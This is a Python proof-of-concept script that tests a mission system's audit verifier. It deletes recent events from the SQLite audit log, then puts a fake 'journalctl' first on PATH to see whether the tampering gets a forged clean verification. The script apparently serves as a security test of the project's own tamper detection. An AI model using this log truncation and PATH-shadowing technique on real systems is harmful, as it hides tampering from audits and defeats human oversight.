#!/usr/bin/env python3
"""Shadow journalctl on PATH and ask the verifier for a clean bill of health.

A normal desktop uid controls PATH. On a stock install ~/.local/bin is writable
and precedes /usr/bin, so this needs no privilege at all.
"""
import os, shutil, sqlite3, subprocess, sys, tempfile, time
from pathlib import Path
ENGINE = Path.home() / "projects/shadowfetch-4.0.0/packages/shadowfetch-missions/data/usr/lib/shadowfetch/missions"
CLI = [sys.executable, str(ENGINE / "sf_missions.py")]
sys.path.insert(0, str(ENGINE))
R0 = tempfile.mkdtemp(prefix="p31path-")
os.environ["SHADOWFETCH_MISSIONS_STATE"] = R0
os.environ["SHADOWFETCH_AGENT_WORKSPACES"] = R0 + "/ws"
import sf_missions as sf

d = tempfile.mkdtemp(prefix="p31path-")
ws = Path(d) / "ws" / "probe"; ws.mkdir(parents=True)
(ws / "a.mkv").write_bytes(b"clip")
os.environ["SHADOWFETCH_AGENT_WORKSPACES"] = str(Path(d) / "ws")
s = sf.Store(d)
mid = s.create(capability="media_export", provider_id="offline-media",
               workspace_value="probe", title="real work", prompt="p", inputs=["a.mkv"])["id"]
s.transition(mid, sf.MissionState.RUNNING)
s.transition(mid, sf.MissionState.WAITING_REVIEW)
time.sleep(1.5)


def verify(env_extra=None):
    env = dict(os.environ, SHADOWFETCH_MISSIONS_STATE=d,
               SHADOWFETCH_AGENT_WORKSPACES=d + "/ws")
    env.update(env_extra or {})
    p = subprocess.run(CLI + ["audit", "verify"], capture_output=True, text=True, env=env)
    line = [l for l in p.stdout.splitlines() if "external anchor" in l or "chain " in l]
    return p.returncode, "; ".join(x.strip() for x in line)


print("honest database:      exit=%d  %s" % verify())

# truncate the log
db = sqlite3.connect(os.path.join(d, "missions.sqlite3"))
db.execute("DELETE FROM events WHERE seq > (SELECT MAX(seq)-2 FROM events)")
db.commit(); db.close()
print("after truncation:     exit=%d  %s" % verify())

# THE ATTACK: a journalctl of our own, first on PATH
fake = Path(tempfile.mkdtemp(prefix="p31bin-"))
(fake / "journalctl").write_text("#!/bin/sh\nexit 0\n")   # reports an empty journal
(fake / "journalctl").chmod(0o755)
code, line = verify({"PATH": str(fake) + ":" + os.environ.get("PATH", "")})
print("with a shadowed journalctl first on PATH:")
print("                      exit=%d  %s" % (code, line))
print()
print("VERDICT:", "ATTACK FAILED -- the anchor cannot be shadowed"
      if code != 0 else "*** FORGED CLEAN BILL OF HEALTH ***")
shutil.rmtree(fake, ignore_errors=True)
